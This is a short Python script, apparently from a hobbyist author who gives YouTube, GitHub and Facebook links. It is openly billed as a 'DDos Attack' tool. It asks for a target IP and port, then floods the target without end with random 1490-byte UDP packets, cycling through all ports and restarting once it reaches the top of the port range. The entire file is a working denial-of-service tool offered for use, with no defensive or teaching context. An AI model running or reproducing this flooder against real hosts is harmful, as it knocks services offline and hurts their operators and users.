import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year


###### Declare Socket ########
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = os.urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print()
print("Author   : HA-MRX")
print("YouTube  : https://www.youtube.com/c/HA-MRX")
print("github   : https://github.com/Ha3MrX")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print()
ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(4)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print(f"Sent {sent} packets to {ip} through port: {port}")
    if port == 16383:
        print("[=====               ] 25%")
        time.sleep(1)
    elif port == 32767:
        print("[==========          ] 50%")
        time.sleep(1)
    elif port == 49150:
        print("[===============     ] 75%")
        time.sleep(1)
    elif port == 65534:
        print("[====================] 100%")
        os.system('figlet Attack Restarting...')
        time.sleep(2)
        port = 1

